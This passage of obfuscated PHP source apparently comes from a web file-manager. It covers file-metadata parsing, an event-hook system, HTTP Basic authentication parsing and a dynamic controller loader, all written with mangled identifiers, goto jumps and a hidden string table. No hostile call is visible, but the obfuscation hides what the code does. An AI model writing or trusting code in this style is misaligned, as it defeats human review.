$bõÖÆ­ãÀ = array($A‰µÆ„ãÎ¹[1584], $A‰µÆ„ãÎ¹[1582]); if (in_array($cÕ›¹ø”õ, $bõÖÆ­ãÀ)) { return !0; } if (isset(self::$fileTypeArray[$A‰µÆ„ãÎ¹[1585]][$cÕ›¹ø”õ])) { return !0; } goto Aµ‰„°Ÿ; cÁÎÏÆŠæ: } private static function parseData($D•Ñ•óÒ²ß, $cÂÄÎŒ§–ˆ, $E™ÒŠ™·Á) { $EëÖØ“ÒÉç =& $_SERVER[»„]; $d†½«ÍÊÇ¨ = $D•Ñ•óÒ²ß[$EëÖØ“ÒÉç[1588]]; $F‚øÓï‘µ = array(); foreach ($cÂÄÎŒ§–ˆ as $a†“Ó…ïà => $C§ĞÃ¹Å‡Ò) { foreach ($C§ĞÃ¹Å‡Ò as $F„øî„œµ”) { if (is_array($F„øî„œµ”)) { $c…í»ÈÇê° = self::parseData($D•Ñ•óÒ²ß, $C§ĞÃ¹Å‡Ò, $E™ÒŠ™·Á); if ($c…í»ÈÇê°) { $F‚øÓï‘µ[$a†“Ó…ïà] = $c…í»ÈÇê°; } break; } $e´ˆóøªĞô = str_replace($EëÖØ“ÒÉç[1362], $d†½«ÍÊÇ¨, $F„øî„œµ”); $c…í»ÈÇê° = _get($D•Ñ•óÒ²ß, $e´ˆóøªĞô); $c…í»ÈÇê° = is_array($c…í»ÈÇê°) ? $c…í»ÈÇê°[0] : $c…í»ÈÇê°; if ($c…í»ÈÇê°) { break; } } if ($c…í»ÈÇê° || $c…í»ÈÇê° === 0 || $c…í»ÈÇê° === !1) { $c…í»ÈÇê° = self::valueReset($F„øî„œµ”, $c…í»ÈÇê°, $a†“Ó…ïà); if ($c…í»ÈÇê° !== null) { $F‚øÓï‘µ[$a†“Ó…ïà] = $c…í»ÈÇê°; } } } $F‚øÓï‘µ = self::valueResetAll($F‚øÓï‘µ, $E™ÒŠ™·Á); return $F‚øÓï‘µ; } private static function psdParse($a¨§†˜Ë³¤) { $dÌ—‡„š² =& $_SERVER[»„]; if (IO::fileSubstr($a¨§†˜Ë³¤, 0, 4) != $dÌ—‡„š²[1589]) { return !1; } $FğáœÒÀ = getImageSize($a¨§†˜Ë³¤, $bŠ¼±îÁƒ); if (!$FğáœÒÀ) { return; } $Fñ§¦ò¸’Ú = array($dÌ—‡„š²[1504] => $FğáœÒÀ[0], $dÌ—‡„š²[1506] => $FğáœÒÀ[1]); return $Fñ§¦ò¸’Ú; } private static function pdfParse($cá¨Í©ØÚ®) { return FileParsePdf::parse($cá¨Í©ØÚ®); } private static function fileTypeParse() { $Bâ¦¹’ò›³ =& $_SERVER[»„]; $C‹Ç†©íÖÂ = self::fileTypeArray(); $C–õôØöø = array(); foreach ($C‹Ç†©íÖÂ as $fåòİô => $A¶´Ù™„ö¾) { $fÙ’œç“´Ê = _get($A¶´Ù™„ö¾, $Bâ¦¹’ò›³[156], $Bâ¦¹’ò›³[33]); $c‘Ç‰òÄÀ = is_string($fÙ’œç“´Ê) ? explode($Bâ¦¹’ò›³[47], $fÙ’œç“´Ê) : $fÙ’œç“´Ê; if (!$c‘Ç‰òÄÀ) { continue; } foreach ($c‘Ç‰òÄÀ as $fÙ’œç“´Ê) { $fÙ’œç“´Ê = strtolower(trim($fÙ’œç“´Ê)); if (!$fÙ’œç“´Ê) { continue; } $C–õôØöø[$fÙ’œç“´Ê] = $fåòİô; } $C‹Ç†©íÖÂ[$fåòİô][$Bâ¦¹’ò›³[156]] = array_keys($C–õôØöø); $C‹Ç†©íÖÂ[$fåòİô][$Bâ¦¹’ò›³[1587]] = self::parseKeyMap($A¶´Ù™„ö¾[$Bâ¦¹’ò›³[1587]]); } return array($Bâ¦¹’ò›³[1586] => $C‹Ç†©íÖÂ, $Bâ¦¹’ò›³[1585] => $C–õôØöø); } private static function parseKeyMap($D¶’‰Ó¦š) { $d´õÌØÙ‹ =& $_SERVER[»„]; foreach ($D¶’‰Ó¦š as $aÛª©Äã‘ => $Dì‡ÚÇ”ŠÒ) { if (is_array($Dì‡ÚÇ”ŠÒ)) { $FÕ…æèÜÒ¹ = self::parseKeyMap($Dì‡ÚÇ”ŠÒ); if ($FÕ…æèÜÒ¹) { $D¶’‰Ó¦š[$aÛª©Äã‘] = $FÕ…æèÜÒ¹; } continue; } $Cù¶­£„™¹ = explode($d´õÌØÙ‹[47], $Dì‡ÚÇ”ŠÒ); $E¾ÕÔÇ×šÚ = array(); foreach ($Cù¶­£„™¹ as $AÄŸ‡¥¤ÒÇ) { $AÄŸ‡¥¤ÒÇ = trim($AÄŸ‡¥¤ÒÇ); if (!$AÄŸ‡¥¤ÒÇ) { continue; } if (preg_match($d´õÌØÙ‹[1590], $AÄŸ‡¥¤ÒÇ, $B¾ö›©ø)) { $aÀ—÷Œ…»– = explode($d´õÌØÙ‹[267], $B¾ö›©ø[1]); foreach ($aÀ—÷Œ…»– as $fÆŸ¤İ‡£ù) { $E¾ÕÔÇ×šÚ[] = str_replace($B¾ö›©ø[0], $fÆŸ¤İ‡£ù, $AÄŸ‡¥¤ÒÇ); } } else { $E¾ÕÔÇ×šÚ[] = $AÄŸ‡¥¤ÒÇ; } } $D¶’‰Ó¦š[$aÛª©Äã‘] = $E¾ÕÔÇ×šÚ; } return $D¶’‰Ó¦š; } private static function valueResetAll($EÜ¸‰Èô¿Û, $AÕ·öé½ã×) { goto cïòÖ¯ÅÇ–; e®Ø§Ë˜Ïã: $DÉĞ÷‡ß¥Ï = _get($EÜ¸‰Èô¿Û, $fÉôÒµêÜ„[1603], $fÉôÒµêÜ„[33]); $A†‹¶Â Š³ = $dİÍè­ó–¡ . $añ²ª˜ÜÌÓ . $DÉĞ÷‡ß¥Ï; if ($A†‹¶Â Š³ && get_charset($A†‹¶Â Š³) != $fÉôÒµêÜ„[322]) { $EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1600]][$fÉôÒµêÜ„[1316]] = iconv_to($EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1600]][$fÉôÒµêÜ„[1316]], get_charset($A†‹¶Â Š³), $fÉôÒµêÜ„[322]); $EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1600]][$fÉôÒµêÜ„[1604]] = iconv_to($EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1600]][$fÉôÒµêÜ„[1604]], get_charset($A†‹¶Â Š³), $fÉôÒµêÜ„[322]); $EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1600]][$fÉôÒµêÜ„[1605]] = iconv_to($EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1600]][$fÉôÒµêÜ„[1605]], get_charset($A†‹¶Â Š³), $fÉôÒµêÜ„[322]); } goto Cõèà¡¡¯÷; d„Û†ÙËŒô: if ($aî…—Î‹—Œ) { $aôŸ„ˆó¾‰ = IO_PATH_SYSTEM_TEMP . $fÉôÒµêÜ„[1596] . KodIO::hashPath($AÕ·öé½ã×) . $fÉôÒµêÜ„[1597]; $EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1598]] = Action($fÉôÒµêÜ„[1599])->pluginCacheFileSet($aôŸ„ˆó¾‰, $aî…—Î‹—Œ); unset($EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1600]][$fÉôÒµêÜ„[1583]]); } $dİÍè­ó–¡ = _get($EÜ¸‰Èô¿Û, $fÉôÒµêÜ„[1601], $fÉôÒµêÜ„[33]); $añ²ª˜ÜÌÓ = _get($EÜ¸‰Èô¿Û, $fÉôÒµêÜ„[1602], $fÉôÒµêÜ„[33]); goto e®Ø§Ë˜Ïã; cïòÖ¯ÅÇ–: $fÉôÒµêÜ„ =& $_SERVER[»„]; if (isset($EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1591]])) { $F¢Å†â‘î¸ = ceil($EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1591]]); $cÕõš›¹« = intval($F¢Å†â‘î¸ / 3600); $Dï‘£å = intval(($F¢Å†â‘î¸ - $cÕõš›¹« * 3600) / 60); $EÛ¡Š‰¸ì³ = $F¢Å†â‘î¸ % 60; $EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1592]] = sprintf($fÉôÒµêÜ„[1593], $cÕõš›¹«, $Dï‘£å, $EÛ¡Š‰¸ì³); if ($cÕõš›¹« == 0) { $EÜ¸‰Èô¿Û[$fÉôÒµêÜ„[1592]] = sprintf($fÉôÒµêÜ„[1594], $Dï‘£å, $EÛ¡Š‰¸ì³); } } $aî…—Î‹—Œ = _get($EÜ¸‰Èô¿Û, $fÉôÒµêÜ„[1595]); goto d„Û†ÙËŒô; Cõèà¡¡¯÷: return $EÜ¸‰Èô¿Û; goto dã´ùêÈÍ; dã´ùêÈÍ: } private static function valueReset($böĞ°Ë‹ÅÔ, $fÁÖò ñ ì, $Aò‡¡‡£Ó) { $C‰¬âä„½ =& $_SERVER[»„]; $CËŞäÜÏå‡ = $C‰¬âä„½[1521]; switch ($böĞ°Ë‹ÅÔ) { case $C‰¬âä„½[1606]: $fÁÖò ñ ì = $fÁÖò ñ ì == $C‰¬âä„½[83] ? $C‰¬âä„½[1607] : $C‰¬âä„½[1608]; break; case $C‰¬âä„½[1609]: $fÁÖò ñ ì = $fÁÖò ñ ì ? $fÁÖò ñ ì : null; break; default: break; } switch ($Aò‡¡‡£Ó) { case $C‰¬âä„½[1610]: $fÁÖò ñ ì = round($fÁÖò ñ ì, 2); break; case $C‰¬âä„½[183]: case $C‰¬âä„½[106]: if ($fÁÖò ñ ì < 0) { $fÁÖò ñ ì = null; } else { if (is_numeric($fÁÖò ñ ì)) { $fÁÖò ñ ì = date($CËŞäÜÏå‡, $fÁÖò ñ ì); } } break; default: break; } return $fÁÖò ñ ì; } private static function fileTypeArray() { $dàƒÜæ ®Ğ =& $_SERVER[»„]; return array($dàƒÜæ ®Ğ[1583] => array($dàƒÜæ ®Ğ[156] => $dàƒÜæ ®Ğ[1611] . $dàƒÜæ ®Ğ[1612], $dàƒÜæ ®Ğ[1587] => array($dàƒÜæ ®Ğ[1504] => $dàƒÜæ ®Ğ[1613], $dàƒÜæ ®Ğ[1506] => $dàƒÜæ ®Ğ[1614], $dàƒÜæ ®Ğ[1615] => $dàƒÜæ ®Ğ[1616], $dàƒÜæ ®Ğ[1617] => $dàƒÜæ ®Ğ[1618], $dàƒÜæ ®Ğ[183] => $dàƒÜæ ®Ğ[1619], $dàƒÜæ ®Ğ[106] => $dàƒÜæ ®Ğ[1620], $dàƒÜæ ®Ğ[1621] => $dàƒÜæ ®Ğ[1622], $dàƒÜæ ®Ğ[1623] => $dàƒÜæ ®Ğ[1624], $dàƒÜæ ®Ğ[1625] => $dàƒÜæ ®Ğ[1626], $dàƒÜæ ®Ğ[1627] => $dàƒÜæ ®Ğ[1628], $dàƒÜæ ®Ğ[1629] => $dàƒÜæ ®Ğ[1630], $dàƒÜæ ®Ğ[1631] => $dàƒÜæ ®Ğ[1632], $dàƒÜæ ®Ğ[1633] => $dàƒÜæ ®Ğ[1634], $dàƒÜæ ®Ğ[1635] => array($dàƒÜæ ®Ğ[1636] => $dàƒÜæ ®Ğ[1637], $dàƒÜæ ®Ğ[1638] => $dàƒÜæ ®Ğ[1639], $dàƒÜæ ®Ğ[1640] => $dàƒÜæ ®Ğ[1641]), $dàƒÜæ ®Ğ[1642] => $dàƒÜæ ®Ğ[1643], $dàƒÜæ ®Ğ[1644] => $dàƒÜæ ®Ğ[1645], $dàƒÜæ ®Ğ[1646] => $dàƒÜæ ®Ğ[1647], $dàƒÜæ ®Ğ[1648] => $dàƒÜæ ®Ğ[1649], $dàƒÜæ ®Ğ[1650] => array($dàƒÜæ ®Ğ[1651] => $dàƒÜæ ®Ğ[1652], $dàƒÜæ ®Ğ[1653] => $dàƒÜæ ®Ğ[1654], $dàƒÜæ ®Ğ[1655] => $dàƒÜæ ®Ğ[1656], $dàƒÜæ ®Ğ[1657] => $dàƒÜæ ®Ğ[1658], $dàƒÜæ ®Ğ[1659] => $dàƒÜæ ®Ğ[1660], $dàƒÜæ ®Ğ[1661] => $dàƒÜæ ®Ğ[1662], $dàƒÜæ ®Ğ[1663] => $dàƒÜæ ®Ğ[1664], $dàƒÜæ ®Ğ[1665] => $dàƒÜæ ®Ğ[1666], $dàƒÜæ ®Ğ[1667] => $dàƒÜæ ®Ğ[1668], $dàƒÜæ ®Ğ[1669] => $dàƒÜæ ®Ğ[1670], $dàƒÜæ ®Ğ[1671] => $dàƒÜæ ®Ğ[1672]))), $dàƒÜæ ®Ğ[1673] => array($dàƒÜæ ®Ğ[156] => $dàƒÜæ ®Ğ[1674] . $dàƒÜæ ®Ğ[1675], $dàƒÜæ ®Ğ[1587] => array($dàƒÜæ ®Ğ[1591] => $dàƒÜæ ®Ğ[1676], $dàƒÜæ ®Ğ[183] => $dàƒÜæ ®Ğ[1677], $dàƒÜæ ®Ğ[106] => $dàƒÜæ ®Ğ[1678], $dàƒÜæ ®Ğ[1623] => $dàƒÜæ ®Ğ[1679], $dàƒÜæ ®Ğ[1680] => $dàƒÜæ ®Ğ[1681], $dàƒÜæ ®Ğ[1682] => $dàƒÜæ ®Ğ[1609], $dàƒÜæ ®Ğ[1683] => $dàƒÜæ ®Ğ[1684], $dàƒÜæ ®Ğ[1685] => $dàƒÜæ ®Ğ[1686], $dàƒÜæ ®Ğ[1687] => $dàƒÜæ ®Ğ[1688], $dàƒÜæ ®Ğ[1600] => array($dàƒÜæ ®Ğ[1316] => $dàƒÜæ ®Ğ[1689], $dàƒÜæ ®Ğ[1604] => $dàƒÜæ ®Ğ[1690], $dàƒÜæ ®Ğ[1605] => $dàƒÜæ ®Ğ[1691], $dàƒÜæ ®Ğ[1692] => $dàƒÜæ ®Ğ[1693], $dàƒÜæ ®Ğ[1694] => $dàƒÜæ ®Ğ[1695], $dàƒÜæ ®Ğ[1696] => $dàƒÜæ ®Ğ[1697], $dàƒÜæ ®Ğ[1583] => $dàƒÜæ ®Ğ[1698]))), $dàƒÜæ ®Ğ[1699] => array($dàƒÜæ ®Ğ[156] => $dàƒÜæ ®Ğ[1700] . $dàƒÜæ ®Ğ[1701], $dàƒÜæ ®Ğ[1587] => array($dàƒÜæ ®Ğ[1504] => $dàƒÜæ ®Ğ[1702], $dàƒÜæ ®Ğ[1506] => $dàƒÜæ ®Ğ[1703], $dàƒÜæ ®Ğ[1591] => $dàƒÜæ ®Ğ[1676], $dàƒÜæ ®Ğ[183] => $dàƒÜæ ®Ğ[1704], $dàƒÜæ ®Ğ[106] => $dàƒÜæ ®Ğ[1705], $dàƒÜæ ®Ğ[1610] => $dàƒÜæ ®Ğ[1706], $dàƒÜæ ®Ğ[1687] => $dàƒÜæ ®Ğ[1707], $dàƒÜæ ®Ğ[1683] => $dàƒÜæ ®Ğ[1708], $dàƒÜæ ®Ğ[1623] => $dàƒÜæ ®Ğ[1709], $dàƒÜæ ®Ğ[1673] => array($dàƒÜæ ®Ğ[1682] => $dàƒÜæ ®Ğ[1609], $dàƒÜæ ®Ğ[1710] => $dàƒÜæ ®Ğ[1711], $dàƒÜæ ®Ğ[1680] => $dàƒÜæ ®Ğ[1681], $dàƒÜæ ®Ğ[1687] => $dàƒÜæ ®Ğ[1688], $dàƒÜæ ®Ğ[1683] => $dàƒÜæ ®Ğ[1712], $dàƒÜæ ®Ğ[1685] => $dàƒÜæ ®Ğ[1686]))), $dàƒÜæ ®Ğ[1713] => array($dàƒÜæ ®Ğ[1587] => array($dàƒÜæ ®Ğ[1714] => $dàƒÜæ ®Ğ[1715], $dàƒÜæ ®Ğ[1716] => $dàƒÜæ ®Ğ[1717])), $dàƒÜæ ®Ğ[1718] => array($dàƒÜæ ®Ğ[1587] => array())); } } class Hook { private static $events = array(); public static function get($D±‚°„·˜È = false) { if (!$D±‚°„·˜È) { return self::$events; } else { return self::$events[$D±‚°„·˜È]; } } public static function apply($c™ˆíØ“×…, $Cé³£Êª¦ƒ = array()) { $EëøÉËøä = ActionApply($c™ˆíØ“×…, $Cé³£Êª¦ƒ); if (is_string($c™ˆíØ“×…)) { Hook::trigger($c™ˆíØ“×…); } return $EëøÉËøä; } public static function bind($c¹îê«”ëó, $bË¾‘ñŒÎ‹, $Bƒ‹†±¬êĞ = false) { $E‡†¦ƒ¼Šß =& $_SERVER[»„]; if (!isset(self::$events[$c¹îê«”ëó])) { self::$events[$c¹îê«”ëó] = array(); } self::$events[$c¹îê«”ëó][] = array($E‡†¦ƒ¼Šß[1719] => $bË¾‘ñŒÎ‹, $E‡†¦ƒ¼Šß[1720] => $Bƒ‹†±¬êĞ, $E‡†¦ƒ¼Šß[1721] => 0); } public static function once($A‹¢ï ƒ†, $aĞ‹«„ò­¯) { self::bind($A‹¢ï ƒ†, $aĞ‹«„ò­¯, !0); } public static function unbind($Eº‡„è¬’, $Aˆ‹•ëƒ§ = false) { if (!$Aˆ‹•ëƒ§) { self::$events[$Eº‡„è¬’] = array(); return; } $a‰ô è»¬ğ = self::$events[$Eº‡„è¬’]; self::$events[$Eº‡„è¬’] = array(); if (!is_array($a‰ô è»¬ğ)) { return; } for ($e˜õ£ÚÊ¼ó = 0; $e˜õ£ÚÊ¼ó < count($a‰ô è»¬ğ); $e˜õ£ÚÊ¼ó++) { if ($a‰ô è»¬ğ[$e˜õ£ÚÊ¼ó][$_SERVER[»„][1719]] == $Aˆ‹•ëƒ§) { continue; } self::$events[$Eº‡„è¬’][] = $a‰ô è»¬ğ[$e˜õ£ÚÊ¼ó]; } } public static function filter($bä„ŸƒøŠ, $Bö¢Ñäâ) { goto e³áİ×¾; e³áİ×¾: $B†œİ‡’Ìí =& $_SERVER[»„]; $Cïİì±ˆÜ = self::$events; if (!isset($Cïİì±ˆÜ[$bä„ŸƒøŠ])) { return $Bö¢Ñäâ; } goto d„İ’³—ğ; c„‰Ğ¡áğÑ: for ($AµÒ¨¦‡Âô = 0; $AµÒ¨¦‡Âô < count($Föñğ¤£¼Â); $AµÒ¨¦‡Âô++) { $bñÇÖì—ñÒ = $Föñğ¤£¼Â[$AµÒ¨¦‡Âô]; if ($bñÇÖì—ñÒ[$B†œİ‡’Ìí[1720]] && $bñÇÖì—ñÒ[$B†œİ‡’Ìí[1721]] > 1) { continue; } self::$events[$bä„ŸƒøŠ][$AµÒ¨¦‡Âô][$B†œİ‡’Ìí[1721]] = $bñÇÖì—ñÒ[$B†œİ‡’Ìí[1721]] + 1; $eŒ¡Ş‘Ô¥ = self::apply($bñÇÖì—ñÒ[$B†œİ‡’Ìí[1719]], array($c¢ÃŸç˜”É)); if (gettype($eŒ¡Ş‘Ô¥) == gettype($c¢ÃŸç˜”É)) { $c¢ÃŸç˜”É = $eŒ¡Ş‘Ô¥; } } return $c¢ÃŸç˜”É; goto BÉºÎºÕ£; d„İ’³—ğ: $Föñğ¤£¼Â = $Cïİì±ˆÜ[$bä„ŸƒøŠ]; $c¢ÃŸç˜”É = $Bö¢Ñäâ; if (!is_array($Föñğ¤£¼Â) || count($Föñğ¤£¼Â) == 0) { return $c¢ÃŸç˜”É; } goto c„‰Ğ¡áğÑ; BÉºÎºÕ£: } public static function trigger($E¤é÷ÛÔ¿ø) { goto A÷Õì½İï; eøº÷ÂÀÖ: $cë°“®ììÚ = func_get_args(); array_shift($cë°“®ììÚ); for ($Cç‚’¾á÷î = 0; $Cç‚’¾á÷î < count($D¡óèç‰‘); $Cç‚’¾á÷î++) { $B‡›éÇŠÑ = $D¡óèç‰‘[$Cç‚’¾á÷î]; if ($B‡›éÇŠÑ[$AÛ°‰ç±—¬[1720]] && $B‡›éÇŠÑ[$AÛ°‰ç±—¬[1721]] > 1) { continue; } if (defined($AÛ°‰ç±—¬[1722]) && GLOBAL_LOG_HOOK) { write_log($E¤é÷ÛÔ¿ø . $AÛ°‰ç±—¬[1723] . $B‡›éÇŠÑ[$AÛ°‰ç±—¬[1719]], $AÛ°‰ç±—¬[1724]); } self::$events[$E¤é÷ÛÔ¿ø][$Cç‚’¾á÷î][$AÛ°‰ç±—¬[1721]] = $B‡›éÇŠÑ[$AÛ°‰ç±—¬[1721]] + 1; $fÖ¸¹’·¬è = self::apply($B‡›éÇŠÑ[$AÛ°‰ç±—¬[1719]], $cë°“®ììÚ); if (defined($AÛ°‰ç±—¬[1722]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $AÛ°‰ç±—¬[1724]); if ($B‡›éÇŠÑ[$AÛ°‰ç±—¬[1721]] == 200) { $A±ˆ”Ùö¿” = is_array($B‡›éÇŠÑ[$AÛ°‰ç±—¬[1719]]) ? json_encode_force($B‡›éÇŠÑ[$AÛ°‰ç±—¬[1719]]) : $B‡›éÇŠÑ[$AÛ°‰ç±—¬[1719]]; write_log($AÛ°‰ç±—¬[1725] . $E¤é÷ÛÔ¿ø . $AÛ°‰ç±—¬[1726] . $A±ˆ”Ùö¿”, $AÛ°‰ç±—¬[1727]); } } $c‘ÔŠÄªÌ = is_null($fÖ¸¹’·¬è) ? $c‘ÔŠÄªÌ : $fÖ¸¹’·¬è; } goto Dœ’í´ˆªÆ; A÷Õì½İï: $AÛ°‰ç±—¬ =& $_SERVER[»„]; $A·ßáîªºá = self::$events; $c‘ÔŠÄªÌ = !1; goto D¦…¹‹ßç; Dœ’í´ˆªÆ: return $c‘ÔŠÄªÌ; goto bèìÍÂÀ…Ê; D¦…¹‹ßç: if (!isset($A·ßáîªºá[$E¤é÷ÛÔ¿ø])) { return $c‘ÔŠÄªÌ; } $D¡óèç‰‘ = $A·ßáîªºá[$E¤é÷ÛÔ¿ø]; if (!is_array($D¡óèç‰‘) || count($D¡óèç‰‘) == 0) { return $c‘ÔŠÄªÌ; } goto eøº÷ÂÀÖ; bèìÍÂÀ…Ê: } } class HttpAuth { public static function get() { $b‡Ê¤—¼å» =& $_SERVER[»„]; $DÓØÖˆñÍ = $b‡Ê¤—¼å»[33]; $cÒ£Ü·¯‹æ = $b‡Ê¤—¼å»[33]; if (isset($_SERVER[$b‡Ê¤—¼å»[1728]])) { $DÓØÖˆñÍ = $_SERVER[$b‡Ê¤—¼å»[1728]]; $cÒ£Ü·¯‹æ = $_SERVER[$b‡Ê¤—¼å»[1729]]; } elseif (isset($_SERVER[$b‡Ê¤—¼å»[1730]])) { $AÉÍÏ´öÍÙ = $_SERVER[$b‡Ê¤—¼å»[1730]]; if (strpos(strtolower($AÉÍÏ´öÍÙ), $b‡Ê¤—¼å»[1731]) === 0) { $a™ôíé²ŞÒ = explode($b‡Ê¤—¼å»[4], base64_decode(substr($AÉÍÏ´öÍÙ, 6))); $DÓØÖˆñÍ = isset($a™ôíé²ŞÒ[0]) ? $a™ôíé²ŞÒ[0] : $b‡Ê¤—¼å»[33]; $cÒ£Ü·¯‹æ = isset($a™ôíé²ŞÒ[1]) ? $a™ôíé²ŞÒ[1] : 0; } } return array($b‡Ê¤—¼å»[531] => $DÓØÖˆñÍ, $b‡Ê¤—¼å»[887] => $cÒ£Ü·¯‹æ); } public static function error() { goto cª†ÌŒŸ‡á; dâäĞ¥¥õ­: header($b©Ò«Ô÷”[1734]); header($b©Ò«Ô÷”[1735]); header($b©Ò«Ô÷”[1243]); goto C‡öĞÛ­ä; cª†ÌŒŸ‡á: $b©Ò«Ô÷” =& $_SERVER[»„]; header($b©Ò«Ô÷”[1732]); header($b©Ò«Ô÷”[1733]); goto dâäĞ¥¥õ­; C‡öĞÛ­ä: die; goto F«Ğã‚ïŠÀ; F«Ğã‚ïŠÀ: } public static function make($Aî¶¯ßè¬», $Cİ‘¯‹ÈŒ­) { $BŞÑÙ¦§ôÂ =& $_SERVER[»„]; return $BŞÑÙ¦§ôÂ[1736] + base64_encode($Aî¶¯ßè¬» . $BŞÑÙ¦§ôÂ[4] . $Cİ‘¯‹ÈŒ­); } } goto B–²ßø¤…Ê; bçîÒæßÇç: function beforeShutdownFatalError($eÑÙÛÛˆ¯ö) { think_exception($eÑÙÛÛˆ¯ö); } $_SERVER[$_SERVER[ÓÊÌ][48]] = $CÒ“×“¢¤‡($_SERVER[$_SERVER[ÓÊÌ][45]]); $Eğ”Ä³Áï¬ = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto cêÂôãà §; aò«ã‹¿ô: function Action($FÄ­§‘ = '') { goto aËó‚Ñª; BØ…³³Ä†: if (isset($D¼â‘Áõêğ[$F¾Òè–æ©¹])) { return $D¼â‘Áõêğ[$F¾Òè–æ©¹]; } $FÄ­§‘ = trim(str_replace($d˜ŸÅµŸ—œ[4], $d˜ŸÅµŸ—œ[5], $FÄ­§‘), $d˜ŸÅµŸ—œ[4]); $EÛö´Ã¦¬ô = explode($d˜ŸÅµŸ—œ[5], $FÄ­§‘); goto eóƒ‰”Ü“Ÿ; Eš´ğì¾ß: if (isset($D¼â‘Áõêğ[$c­êíêÊ¶])) { return $D¼â‘Áõêğ[$c­êíêÊ¶]; } if (is_file($E‰Ÿ˜ÛÁ”Ÿ)) { include_once $E‰Ÿ˜ÛÁ”Ÿ; } if (!class_exists($fí—¦®×Ê¬)) { return actionCallError("\x5b{$FÄ­§‘}\40\x3d\76\40{$fí—¦®×Ê¬}\x5d\40\143\154\141\x73\x73\40\x6e\157\164\x20\x65\170\151\163\164\163\x21"); } goto cõ““ÂâÆê; eóƒ‰”Ü“Ÿ: $D¸õ‹§Èù = strtolower($EÛö´Ã¦¬ô[0]); if (substr($D¸õ‹§Èù, -6) == $d˜ŸÅµŸ—œ[6]) { $FÄ­§‘ = substr($EÛö´Ã¦¬ô[0], 0, -6); $fí—¦®×Ê¬ = $FÄ­§‘ . $d˜ŸÅµŸ—œ[7]; $E‰Ÿ˜ÛÁ”Ÿ = $d˜ŸÅµŸ—œ[8]; if (isset($EÛö´Ã¦¬ô[1]) && substr(strtolower($EÛö´Ã¦¬ô[1]), -5) == $d˜ŸÅµŸ—œ[9]) { $fí—¦®×Ê¬ = $FÄ­§‘ . $EÛö´Ã¦¬ô[1]; $E‰Ÿ˜ÛÁ”Ÿ = $d˜ŸÅµŸ—œ[10] . $EÛö´Ã¦¬ô[1] . $d˜ŸÅµŸ—œ[11]; } else { if (count($EÛö´Ã¦¬ô) == 3) { $fí—¦®×Ê¬ = $FÄ­§‘ . $EÛö´Ã¦¬ô[1] . $EÛö´Ã¦¬ô[2]; $E‰Ÿ˜ÛÁ”Ÿ = $d˜ŸÅµŸ—œ[12] . $EÛö´Ã¦¬ô[1] . $d˜ŸÅµŸ—œ[13] . $EÛö´Ã¦¬ô[2] . $d˜ŸÅµŸ—œ[11]; } } $E‰Ÿ˜ÛÁ”Ÿ = PLUGIN_DIR . $FÄ­§‘ . $d˜ŸÅµŸ—œ[4] . $E‰Ÿ˜ÛÁ”Ÿ; } else { if (substr($D¸õ‹§Èù, -5) == $d˜ŸÅµŸ—œ[9]) { $FÄ­§‘ = substr($EÛö´Ã¦¬ô[0], 0, -5); return Model($FÄ­§‘); } else { $fí—¦®×Ê¬ = $EÛö´Ã¦¬ô[0] . $EÛö´Ã¦¬ô[1]; $E‰Ÿ˜ÛÁ”Ÿ = CONTROLLER_DIR . $EÛö´Ã¦¬ô[0] . $d˜ŸÅµŸ—œ[4] . $EÛö´Ã¦¬ô[1] . $d˜ŸÅµŸ—œ[14]; } } $c­êíêÊ¶ = strtolower($fí—¦®×Ê¬); goto Eš´ğì¾ß; aËó‚Ñª: $d˜ŸÅµŸ—œ =& $_SERVER[ÓÊÌ]; static $D¼â‘Áõêğ = array(); $F¾Òè–æ©¹ = $FÄ­§‘; goto BØ…³³Ä†; cõ““ÂâÆê: $D¼â‘Áõêğ[$c­êíêÊ¶] = new $fí—¦®×Ê¬(); $D¼â‘Áõêğ[$F¾Òè–æ©¹] = $D¼â‘Áõêğ[$c­êíêÊ¶]; return $D¼â‘Áõêğ[$c­êíêÊ¶]; goto D§‚´Íë½Ü; D§‚´Íë½Ü: } function ActionApply($BòÛ†ÃÌò¿, $E¯¼áˆ±ÑŒ = array()) { goto aµ²‚ìÔ±¯; aµ²‚ìÔ±¯: if (is_array($BòÛ†ÃÌò¿)) { return call_user_func_array($BòÛ†ÃÌò¿, $E¯¼áˆ±ÑŒ); } if (function_exists($BòÛ†ÃÌò¿)) { return call_user_func_array($BòÛ†ÃÌò¿, $E¯¼áˆ±ÑŒ); } $Bñ¬äÜÂ´† = strrpos($BòÛ†ÃÌò¿, $_SERVER[ÓÊÌ][5]); goto fŸíãÚ¤·é; fŸíãÚ¤·é: $BŸÇÙ•Š… = substr($BòÛ†ÃÌò¿, 0, $Bñ¬äÜÂ´†); $EòæâçÉ’¯ = substr($BòÛ†ÃÌò¿, $Bñ¬äÜÂ´† + 1); $EÂ²ˆˆÕì” = Action($BŸÇÙ•Š…); goto DèÔ°‚Ìİ†; DèÔ°‚Ìİ†: if (!method_exists($EÂ²ˆˆÕì”, $EòæâçÉ’¯)) { return actionCallError("{$BòÛ†ÃÌò¿}\40\155\145\164\150\x6f\x64\x20\x6e\157\164\40\145\170\151\163\164\x73\41"); } $d­³”Õè‡À = call_user_func_array(array($EÂ²ˆˆÕì”, $EòæâçÉ’¯), $E¯¼áˆ±ÑŒ); return $d­³”Õè‡À; goto b÷’ŠŞóé; b÷’ŠŞóé: } function actionCallError($Cåíà¡Ã¢) { $dÆâàçí² =& $_SERVER[ÓÊÌ]; $BĞØÆ»Ø±¡ = json_encode_force(array($dÆâàçí²[15] => this_url(), $dÆâàçí²[16] => $GLOBALS[$dÆâàçí²[16]])); $BĞØÆ»Ø±¡ = str_replace(array($dÆâàçí²[17]), array($dÆâàçí²[4]), $BĞØÆ»Ø±¡); return write_log($Cåíà¡Ã¢ . $dÆâàçí²[18] . $BĞØÆ»Ø±¡, $dÆâàçí²[19]); } goto cò÷†ÈÔ¬ï; f‰’‹–à§ˆ: if 